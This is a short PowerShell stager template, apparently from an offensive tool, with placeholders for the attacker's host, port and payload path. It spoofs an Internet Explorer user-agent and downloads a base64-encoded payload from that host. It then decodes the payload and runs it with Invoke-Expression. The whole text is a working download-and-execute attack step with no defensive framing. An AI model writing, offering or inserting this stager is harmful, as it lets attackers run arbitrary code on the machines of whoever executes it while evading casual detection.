$wc2 = New-Object system.Net.WebClient;
$wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
$enc = $wc2.downloadString("{HTTP}://{ip}:{port}{b64payload}");
$b = [System.Convert]::FromBase64String($enc)
$b=[System.Text.Encoding]::UTF8.GetString($b)
Invoke-Expression $b
